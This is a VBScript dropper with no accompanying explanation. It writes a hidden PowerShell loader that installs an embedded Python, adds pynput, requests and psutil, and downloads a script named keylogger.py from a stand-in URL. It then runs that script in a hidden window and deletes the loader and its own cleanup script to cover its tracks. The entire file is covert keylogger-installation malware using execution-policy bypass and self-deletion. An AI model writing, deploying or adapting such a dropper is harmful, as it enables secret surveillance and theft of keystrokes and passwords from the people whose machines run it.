Dim fso, shell, tempFolder, psFile, psCode

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
psFile = tempFolder & "\loader.ps1"

psCode = ""
psCode = psCode & "[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null" & vbCrLf
psCode = psCode & "$InstallPath = 'C:\Program Files\Python311'" & vbCrLf
psCode = psCode & "New-Item -ItemType Directory -Force -Path $InstallPath | Out-Null" & vbCrLf
psCode = psCode & "$arch = if ([Environment]::Is64BitOperatingSystem) { 'amd64' } else { 'win32' }" & vbCrLf
psCode = psCode & "$pythonUrl = if ($arch -eq 'amd64') {" & vbCrLf
psCode = psCode & "  'https://www.python.org/ftp/python/3.11.2/python-3.11.2-embed-amd64.zip'" & vbCrLf
psCode = psCode & "} else {" & vbCrLf
psCode = psCode & "  'https://www.python.org/ftp/python/3.11.2/python-3.11.2-embed-win32.zip'" & vbCrLf
psCode = psCode & "}" & vbCrLf
psCode = psCode & "$zipFile = '$InstallPath\python.zip'" & vbCrLf
psCode = psCode & "Invoke-WebRequest -Uri $pythonUrl -OutFile $zipFile -UseBasicParsing" & vbCrLf
psCode = psCode & "Expand-Archive -Path $zipFile -DestinationPath $InstallPath -Force" & vbCrLf
psCode = psCode & "Invoke-WebRequest -Uri 'https://bootstrap.pypa.io/get-pip.py' -OutFile '$InstallPath\get-pip.py' -UseBasicParsing" & vbCrLf
psCode = psCode & "& '$InstallPath\python.exe' '$InstallPath\get-pip.py'" & vbCrLf
psCode = psCode & "$libs = @('requests', 'pynput', 'psutil')" & vbCrLf
psCode = psCode & "foreach ($lib in $libs) { & '$InstallPath\python.exe' -m pip install $lib --quiet --disable-pip-version-check --no-input }" & vbCrLf
psCode = psCode & "$klScriptUrl = 'https://example.com/keylogger.py'" & vbCrLf
psCode = psCode & "Invoke-WebRequest -Uri $klScriptUrl -OutFile '$InstallPath\main.py' -UseBasicParsing" & vbCrLf
psCode = psCode & "Start-Process -WindowStyle Hidden -FilePath '$InstallPath\python.exe' -ArgumentList '$InstallPath\main.py'" & vbCrLf
psCode = psCode & "Remove-Item -Path $MyInvocation.MyCommand.Path -Force" & vbCrLf

Dim file
Set file = fso.CreateTextFile(psFile, True)
file.WriteLine psCode
file.Close

shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """", 0, False

Set delScript = fso.CreateTextFile(tempFolder & "\cleanup.vbs", True)
delScript.WriteLine "WScript.Sleep 2000"
delScript.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
delScript.WriteLine "fso.DeleteFile WScript.ScriptFullName"
delScript.WriteLine "fso.DeleteFile """ & psFile & """"
delScript.Close
shell.Run "wscript.exe """ & tempFolder & "\cleanup.vbs""", 0, False
